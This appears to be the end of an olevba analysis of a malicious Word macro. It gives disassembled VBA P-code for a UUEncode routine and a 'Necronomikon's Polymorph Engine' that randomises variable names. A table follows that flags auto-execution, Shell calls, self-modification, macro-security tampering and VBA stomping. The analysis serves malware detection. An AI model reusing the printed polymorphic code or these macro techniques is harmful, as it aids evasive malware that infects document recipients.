' 	IDiv 
' 	St lfull 
' Line #147:
' 	LitDI2 0x002D 
' 	ArgsLd Space 0x0001 
' 	St sDa 
' Line #148:
' 	Ld lfull 
' 	LitDI2 0x0000 
' 	Gt 
' 	While 
' Line #149:
' 	Ld nFi 
' 	LitDefault 
' 	Ld sDa 
' 	GetRec 
' Line #150:
' 	Ld nFo 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "M"
' 	Ld sDa 
' 	ArgsLd Encode 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #151:
' 	Ld lfull 
' 	LitDI2 0x0001 
' 	Sub 
' 	St lfull 
' Line #152:
' 	ArgsCall DoEvents 0x0000 
' Line #153:
' 	Wend 
' Line #154:
' 	Ld lbytei 
' 	LitDI2 0x002D 
' 	Mod 
' 	ArgsLd Space 0x0001 
' 	St sDa 
' Line #155:
' 	Ld nFi 
' 	LitDefault 
' 	Ld sDa 
' 	GetRec 
' Line #156:
' 	Ld nFo 
' 	Sharp 
' 	PrintChan 
' 	Ld sDa 
' 	FnLen 
' 	LitDI2 0x0020 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld sDa 
' 	ArgsLd Encode 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #157:
' 	Ld nFo 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "end"
' 	PrintItemNL 
' Line #158:
' 	Ld nFi 
' 	Close 0x0001 
' Line #159:
' 	Ld nFo 
' 	Close 0x0001 
' Line #160:
' 	Label ERR_UUEncode 
' Line #161:
' 	Ld nFi 
' 	Close 0x0001 
' Line #162:
' 	Ld nFo 
' 	Close 0x0001 
' Line #163:
' 	ExitFunc 
' Line #164:
' 	EndFunc 
' Line #165:
' 	FuncDefn (Private Function NPE(poly, id_FFFE As Variant))
' Line #166:
' 	Rem 0x0020 " Necronomikon's Polymorph Engine"
' Line #167:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0006 
' 	VarDefn VaR
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	ArgsCall Read 0x0000 
' Line #168:
' 	LitStr 0x0004 "poly"
' 	LitDI2 0x0001 
' 	ArgsSt VaR 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "NPE"
' 	LitDI2 0x0002 
' 	ArgsSt VaR 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "VaR"
' 	LitDI2 0x0003 
' 	ArgsSt VaR 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "nec"
' 	LitDI2 0x0004 
' 	ArgsSt VaR 0x0001 
' Line #169:
' 	LitStr 0x0005 "morph"
' 	LitDI2 0x0005 
' 	ArgsSt VaR 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "NewVar"
' 	LitDI2 0x0006 
' 	ArgsSt VaR 0x0001 
' Line #170:
' 	StartForVariable 
' 	Ld nec 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	For 
' Line #171:
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St nec_nec 
' Line #172:
' 	LitDI2 0x0001 
' 	Ld poly 
' 	Ld nec 
' 	ArgsLd VaR 0x0001 
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	While 
' Line #173:
' 	LitDI2 0x0001 
' 	Ld poly 
' 	Ld nec 
' 	ArgsLd VaR 0x0001 
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	St morph 
' Line #174:
' 	Ld poly 
' 	LitDI2 0x0001 
' 	Ld morph 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	Ld NewVar 
' 	Concat 
' 	Ld poly 
' 	Ld morph 
' 	Ld nec 
' 	ArgsLd VaR 0x0001 
' 	FnLen 
' 	Add 
' 	Ld poly 
' 	FnLen 
' 	Ld morph 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St poly 
' Line #175:
' 	Wend 
' Line #176:
' 	StartForVariable 
' 	Next 
' Line #177:
' 	Ld poly 
' 	St NPE 
' Line #178:
' 	EndFunc 
' Line #179:
' Line #180:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.microsoft|URL                                          |
|          |.com/               |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

